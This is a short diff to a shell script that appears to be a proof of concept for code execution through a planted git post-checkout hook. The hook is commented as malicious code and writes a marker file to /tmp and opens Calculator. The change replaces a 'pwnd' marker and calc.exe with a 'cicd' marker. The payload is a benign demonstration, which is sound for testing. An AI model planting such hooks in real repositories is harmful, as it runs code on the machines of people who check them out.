@@ -18,8 +18,7 @@ mkdir -p y/hooks
 # Write the malicious code to a hook
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
+echo "cicd" > /tmp/cicd
 open -a Calculator.app
 EOF
 
